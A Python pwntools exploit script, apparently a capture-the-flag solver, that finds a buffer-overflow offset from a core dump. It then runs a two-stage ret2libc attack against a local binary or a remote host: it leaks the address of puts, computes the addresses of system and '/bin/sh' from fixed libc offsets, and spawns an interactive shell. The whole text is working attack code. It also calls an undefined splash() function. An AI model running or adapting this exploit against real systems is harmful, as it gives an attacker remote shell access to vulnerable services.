from pwn import *
import sys

argv = sys.argv

DEBUG = False
BINARY = argv[1]
elf = ELF(BINARY)


context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
	gdb.attach(sh)


if DEBUG:
	context.log_level = 'debug'

def getAutoPayload():
	# Generate a cyclic pattern so that we can auto-find the offset
	payload = cyclic(256)

	# Run the process once so that it crashes
	autoproc = process(BINARY)
	autoproc.sendline(payload)
	autoproc.wait()

	# Get the core dump
	core = Coredump('./core')

	# Our cyclic pattern should have been used as the crashing address
	assert pack(core.fault_addr) in payload

	# Cool! Now let's just replace that value with the address needed
	faultloc = cyclic_find(pack(core.fault_addr))

	payload = b"A" * faultloc
	return payload

def connect():
    if len(argv) < 3:
    	stdout = process.PTY
    	stdin = process.PTY

    	sh = process(BINARY, stdout=stdout, stdin=stdin)

    	if DEBUG:
    		attach_gdb()

    	REMOTE = False
    else:
    	NC = sys.argv[2]
    	ip = NC.split(":")[0]
    	port = int(NC.split(":")[1])
    	sh = remote(ip, port)
    	REMOTE = True
    return sh

# Cool!
splash()

# Generate auto payload
startpayload = getAutoPayload()

# Connect to local/remote process
sh = connect()

puts_plt = p32(elf.plt["puts"])
puts_got = p32(elf.got["puts"])
main_addr = p32(elf.symbols["main"])

# First pass
print("1st pass...")
payload = startpayload + puts_plt + main_addr + puts_got
sh.sendline(payload)
leak = sh.recvline_startswith("`")[:4]
leaked_puts = int.from_bytes(leak, byteorder='little')
print("LEAKED PUTS ADDR: " + str(hex(leaked_puts)))

# Second pass
print("2nd pass...")
sys_addr = p32(leaked_puts - 0x2a650)
binsh = p32(leaked_puts + 0x11456f)
payload = startpayload + sys_addr + b"A"*4 + binsh
sh.sendline(payload)

# Open shell
sh.interactive()